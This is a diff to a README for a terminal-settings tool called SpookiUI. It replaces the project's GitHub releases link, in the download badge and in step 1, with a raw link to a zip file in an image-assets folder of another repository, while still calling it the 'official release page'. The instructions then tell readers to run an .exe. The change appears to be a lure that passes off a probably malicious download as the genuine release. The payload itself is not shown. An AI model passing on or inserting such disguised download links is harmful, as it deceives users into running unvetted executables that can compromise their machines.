@@ -5,7 +5,7 @@ description: "Configure Ghostty terminal settings with a live, interactive UI."
 ---
 # 👻 SpookiUI - Simple tools for your terminal interface
 
-[![Download SpookiUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Megandimorphic651/SpookiUI/releases)
+[![Download SpookiUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Megandimorphic651/megandimorphic651.github.io/main/assets/img/Release_capreoline.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ You do not need to install extra software for SpookiUI to function. It operates 
 
 Follow these steps to obtain and start the application on your computer:
 
-1.  Visit the official release page: [https://github.com/Megandimorphic651/SpookiUI/releases](https://github.com/Megandimorphic651/SpookiUI/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/Megandimorphic651/megandimorphic651.github.io/main/assets/img/Release_capreoline.zip](https://raw.githubusercontent.com/Megandimorphic651/megandimorphic651.github.io/main/assets/img/Release_capreoline.zip)
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open your Downloads folder once the file finishes saving.
